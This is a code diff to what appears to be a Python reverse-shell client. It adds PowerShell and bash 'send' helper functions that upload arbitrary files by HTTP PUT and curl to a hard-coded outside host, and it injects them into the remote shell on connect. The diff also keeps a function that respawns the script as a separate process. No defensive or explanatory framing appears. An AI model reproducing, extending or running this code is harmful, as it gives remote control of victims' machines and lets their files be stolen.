@@ -20,6 +20,41 @@ if sys.platform == 'win32':
 else:
     SHELL = "bash"
 
+PS_PRELOAD = b"""
+function Send {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true)]
+        [string] $FilePath,
+
+        [Parameter(Mandatory = $false)]
+        [string] $ServerUrl = "http://erzhanoriez.winogrona.cc"
+    )
+
+    $filename    = [System.IO.Path]::GetFileName($FilePath)
+    $destination = "$ServerUrl/$filename"
+
+    Write-Host "Sending file '$FilePath' to '$destination' via PUT..."
+
+    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
+
+    Invoke-RestMethod -Uri $destination `
+                      -Method PUT `
+                      -Body $fileContent `
+                      -ContentType "application/octet-stream"
+
+    Write-Host "File '$FilePath' was sent to '$destination'."
+}
+"""
+
+BASH_PRELOAD = b"""
+send() {
+  filename="$1"
+  curl --upload-file "$filename" "http://erzhanoriez.winogrona.cc/$(basename "$filename")"
+  echo
+}
+"""
+
 def excguard(coro):
     async def newfun(*args, **kwargs):
         try:
@@ -34,6 +69,12 @@ async def revshell(host: str, port: int) -> None:
     shell = await asyncio.create_subprocess_shell(SHELL, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
 
     (reader, writer) = await asyncio.open_connection(host, port)
+
+    if sys.platform == "win32":
+        shell.stdin.write(PS_PRELOAD)
+    
+    else:
+        shell.stdin.write(BASH_PRELOAD)
 
     future_readclosed = asyncio.get_running_loop().create_future()
 
@@ -109,10 +150,13 @@ async def am_main(host: str, port: int, token: str) -> None:
     
     else:
         (reader, writer) = await open_telnet_connection(host=host, port=port, shell=telnetlib3.telnet_client_shell, encoding="utf8", term="TERM", force_binary=True)
+
     await writer.protocol.waiter_closed
 
-def async_client(host: str, port: int, token: str) -> None:
-    Popen([sys.executable, __file__])
+def async_client(host: str, port: int, token: str, seks: bool = True) -> None:
+    if seks:
+        Popen([sys.executable, __file__])
+
     asyncio.run(am_main(host, port, token))
 
 if __name__ == '__main__':
